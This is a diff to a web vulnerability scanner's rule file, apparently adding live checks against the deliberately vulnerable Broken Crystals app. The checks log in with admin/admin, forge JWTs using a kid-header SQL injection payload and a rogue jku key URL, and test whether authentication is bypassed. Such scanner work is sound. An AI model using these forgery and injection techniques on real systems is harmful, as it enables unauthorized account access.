@@ -113079,6 +113079,76 @@ const brokencrystalsJwtKidSqlRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+/** POST /api/auth/jwt/kid-sql/login + kid SQL injection JWT on companion /validate — KID SQL login chain. */
+const brokencrystalsJwtKidSqlLoginLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/jwt/kid-sql/login", ctx.origin).toString();
+  const validateUrl = new URL("/api/auth/jwt/kid-sql/validate", ctx.origin).toString();
+  const loginBody = JSON.stringify({ user: "admin", password: "admin", op: "basic" });
+  const [badLogin, goodLogin] = await Promise.all([
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user: "thugir-invalid", password: "invalid", op: "basic" })
+    }),
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: loginBody
+    })
+  ]);
+  if (brokencrystalsJwtLoginTokenOk(badLogin.body)) return NEGATIVE;
+  if (!brokencrystalsJwtLoginTokenOk(goodLogin.body)) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const probeSecret = `thugir-kid-${now.toString(36)}`;
+  const kid = `-1' UNION SELECT '${probeSecret}' --`;
+  const claims = { user: "admin", exp: now + 3600 };
+  const forgedToken = buildHs256Jwt(claims, probeSecret, { kid });
+  const forgedAuth = await ctx.probe.get(validateUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${forgedToken}` }
+  });
+  if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      loginUrl,
+      validateUrl,
+      loginStatus: goodLogin.status,
+      kidPayload: kid,
+      injectedSecret: probeSecret,
+      statusWithForgedJwt: forgedAuth.status,
+      responseSample: forgedAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals POST /api/auth/jwt/kid-sql/login issues JWT; companion /validate accepts kid SQL injection forged HS256 JWT — KID SQL login oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtKidSqlLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/kid-sql\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtKidSqlLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/kid-sql/login route scan — login issues JWT and kid header SQL injection forges valid HMAC signing key on companion /validate"
+    }
+  };
+};
+
 const brokencrystalsSimpleCsrfFlowLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const url = new URL("/api/auth/simple-csrf-flow", ctx.origin).toString();
@@ -113463,6 +113533,73 @@ const brokencrystalsJwtJkuRogueRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Broken Crystals /api/auth/jwt/jku/validate route scan — rogue jku URL in JWT header bypasses authentication"
+    }
+  };
+};
+
+/** POST /api/auth/jwt/jku/login + rogue JKU JWT on companion /validate — JKU injection login chain. */
+const brokencrystalsJwtJkuRogueLoginLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/jwt/jku/login", ctx.origin).toString();
+  const validateUrl = new URL("/api/auth/jwt/jku/validate", ctx.origin).toString();
+  const loginBody = JSON.stringify({ user: "admin", password: "admin", op: "basic" });
+  const [badLogin, goodLogin] = await Promise.all([
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user: "thugir-invalid", password: "invalid", op: "basic" })
+    }),
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: loginBody
+    })
+  ]);
+  if (brokencrystalsJwtLoginTokenOk(badLogin.body)) return NEGATIVE;
+  if (!brokencrystalsJwtLoginTokenOk(goodLogin.body)) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const forgedToken = await buildBrokencrystalsJkuRogueJwt({ user: "admin", exp: now + 3600 });
+  if (!forgedToken) return NEGATIVE;
+  const forgedAuth = await ctx.probe.get(validateUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${forgedToken}` }
+  });
+  if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      loginUrl,
+      validateUrl,
+      loginStatus: goodLogin.status,
+      jkuHeader: "rogue JWK set at GitHub jku.json",
+      validateStatus: forgedAuth.status,
+      responseSample: forgedAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals POST /api/auth/jwt/jku/login issues JWT; companion /validate accepts rogue jku URL JWT — JKU rogue-key login oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtJkuRogueLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/jku\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtJkuRogueLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/jku/login route scan — login issues JWT and rogue jku URL bypasses JKU validation on companion /validate"
     }
   };
 };
@@ -124873,6 +125010,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsJwtWeakKeyRouteLiveOracle,
   brokencrystalsJwtKidSqlLiveOracle,
   brokencrystalsJwtKidSqlRouteLiveOracle,
+  brokencrystalsJwtKidSqlLoginLiveOracle,
+  brokencrystalsJwtKidSqlLoginRouteLiveOracle,
   brokencrystalsSimpleCsrfFlowLiveOracle,
   brokencrystalsSimpleCsrfRouteLiveOracle,
   brokencrystalsJwtHmacConfusionLiveOracle,
@@ -124887,6 +125026,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsJwtX5cRogueRouteLiveOracle,
   brokencrystalsJwtJkuRogueLiveOracle,
   brokencrystalsJwtJkuRogueRouteLiveOracle,
+  brokencrystalsJwtJkuRogueLoginLiveOracle,
+  brokencrystalsJwtJkuRogueLoginRouteLiveOracle,
   brokencrystalsJwtX5uRogueLiveOracle,
   brokencrystalsJwtX5uRogueRouteLiveOracle,
   brokencrystalsJwtJwkRogueLoginLiveOracle,
